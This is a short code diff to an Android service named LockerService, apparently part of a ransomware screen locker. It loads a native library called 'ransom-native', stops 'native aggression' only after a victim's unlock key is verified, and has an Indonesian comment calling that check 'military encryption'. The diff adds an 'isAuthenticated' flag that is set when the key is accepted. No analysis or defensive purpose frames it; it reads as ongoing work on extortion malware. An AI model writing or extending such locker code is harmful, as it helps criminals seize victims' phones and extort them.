@@ -28,6 +28,7 @@ public class LockerService extends Service {
     private CameraManager cameraManager;
     private String cameraId;
     private boolean isFlashOn = false;
+    public static boolean isAuthenticated = false;
 
     static {
         System.loadLibrary("ransom-native");
@@ -175,6 +176,7 @@ public class LockerService extends Service {
         btnUnlock.setOnClickListener(v -> {
             // Menggunakan Enkripsi Militer Native Check
             if (verifyAdvancedKey(inputPass.getText().toString().trim())) {
+                isAuthenticated = true;
                 stopNativeAggression();
                 stopSelf();
             }
